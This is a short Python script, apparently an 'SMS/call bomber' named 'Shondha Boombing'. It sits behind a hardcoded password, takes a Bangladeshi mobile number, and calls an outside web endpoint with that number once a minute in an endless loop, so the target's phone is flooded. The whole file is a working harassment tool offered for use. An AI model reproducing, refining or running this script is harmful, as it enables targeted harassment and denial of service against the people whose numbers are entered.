import requests
import time
import sys

# Password Protection
correct_password = "mehdi hasan"

# Title and Developer's Name
print("\033[1;96m")  # Light Blue color
print("=" * 40)
print(" " * 10 + "Shondha Boombing")
print(" " * 5 + "Developer: Mehdi Hasan")
print("=" * 40)
print("\033[0m")  # Reset color

# Ask for password
while True:
    password = input("\n🔑 Enter Password: ")
    if password == correct_password:
        print("\n✅ Access Granted!")
        break
    else:
        print("❌ Incorrect Password! Try Again.")

# Take mobile number input
number = input("\n📞 Enter Mobile Number (For BD: 8801XXXXXXXXX): ")

# API URL
api_url = f"https://mohammadahad.com/ahad/main.php?num={number}"

# Start bombing
while True:
    try:
        # Send request
        response = requests.get(api_url)

        # Check response status
        if response.status_code == 200:
            print("\n✅ Request sent successfully!")
        else:
            print(f"\n❌ Failed! Status Code: {response.status_code}")

        # 1-minute countdown with animated percentage
        print("\n⏳ Waiting for next request...")

        for i in range(101):  # 0 to 100%
            bar = "█" * (i // 2) + "-" * ((100 - i) // 2)
            sys.stdout.write(f"\r🔄 Progress: |{bar}| {i}%")
            sys.stdout.flush()
            time.sleep(0.6)  # Total 60 seconds (1 minute)

        print("\n\n🔄 Time over, sending next request...")

    except KeyboardInterrupt:
        print("\n\n🛑 Bombing Stopped by User!")
        break  # Exit loop
    except Exception as e:
        print(f"\n⚠️ Error: {e}")
        break